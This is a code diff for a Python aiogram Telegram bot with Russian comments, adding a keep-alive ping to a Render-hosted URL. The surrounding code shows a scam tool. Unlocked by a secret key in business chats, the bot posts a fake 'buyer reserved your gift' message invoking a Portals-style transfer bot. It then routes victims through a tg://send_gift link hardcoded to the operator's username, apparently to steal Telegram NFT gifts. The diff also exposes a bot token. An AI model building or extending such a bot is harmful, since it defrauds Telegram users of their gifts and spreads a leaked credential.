@@ -2,6 +2,7 @@ import re
 import asyncio
 import logging
 import os
+import aiohttp
 from threading import Thread
 from flask import Flask
 from aiogram import Bot, Dispatcher, types, F
@@ -13,6 +14,9 @@ from aiogram.enums import ParseMode
 # ВСТАВЬ СЮДА СВОЙ НОВЫЙ ТОКЕН (если отзывал старый)
 BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
 # ==========================================
+
+# ТВОЯ ССЫЛКА НА RENDER (уже вставлена)
+RENDER_URL = "https://portals-ams5.onrender.com" 
 
 SECRET_KEY = "/unlock_8f3k2m9x" 
 
@@ -32,6 +36,17 @@ def index():
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
+
+# --- ФУНКЦИЯ ПИНГА (ЧТОБЫ RENDER НЕ СПАЛ) ---
+async def keep_alive():
+    while True:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(RENDER_URL) as response:
+                    print(f"Keep-alive ping: {response.status}")
+        except Exception as e:
+            print(f"Keep-alive error: {e}")
+        await asyncio.sleep(600) # Ждать 10 минут (600 секунд)
 
 # --- ЛОГИКА БОТА ---
 @dp.business_message(F.text == SECRET_KEY)
@@ -63,7 +78,6 @@ async def handle_price_command(message: types.Message):
     except Exception as e:
         logging.error(f"Не удалось удалить команду: {e}")
 
-    # Ловим ссылку, цену, валюту (и юзера, если он есть, но мы его потом перезапишем)
     pattern = r"^/price\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
     match = re.match(pattern, message.text, re.IGNORECASE)
     if not match:
@@ -77,7 +91,6 @@ async def handle_price_command(message: types.Message):
 
     price_text = f"{price_value} ⭐" if currency == "stars" else f"{price_value} 💎"
 
-    # Передаем цену в callback_data кнопки "Принять"
     callback_data = f"accept:{price_text}"
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -106,19 +119,16 @@ async def handle_price_command(message: types.Message):
     except Exception as e:
         logging.error(f"Ошибка при отправке: {e}")
 
-# --- ОБРАБОТЧИК КНОПКИ "ПРИНЯТЬ" ---
 @dp.callback_query(F.data.startswith("accept:"))
 async def accept_offer(callback: types.CallbackQuery):
     await callback.answer()
 
     try:
-        # Достаем цену из callback_data
         parts = callback.data.split(":")
         price_str = parts[1]
 
         transfer_bot = "@portals_nftbot"
         
-        # Формируем текст розовой плашки
         new_text = (
             f"<b>Покупатель зарезервировал ваш подарок.</b>\n\n"
             f"<blockquote>"
@@ -132,7 +142,6 @@ async def accept_offer(callback: types.CallbackQuery):
             f"</blockquote>"
         )
 
-        # ЖЕСТКО ЗАДАЕМ ПОЛЬЗОВАТЕЛЯ ДЛЯ ПОДАРКА
         target_username = "portalNftReplayer" 
         gift_link = f"tg://send_gift?to={target_username}"
 
@@ -157,6 +166,10 @@ async def decline_offer(callback: types.CallbackQuery):
 
 async def main():
     Thread(target=run_flask, daemon=True).start()
+    
+    # Запускаем фоновую задачу пинга
+    asyncio.create_task(keep_alive()) 
+    
     print("Бот запущен. Ожидание секретного ключа...")
     await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query"])
 
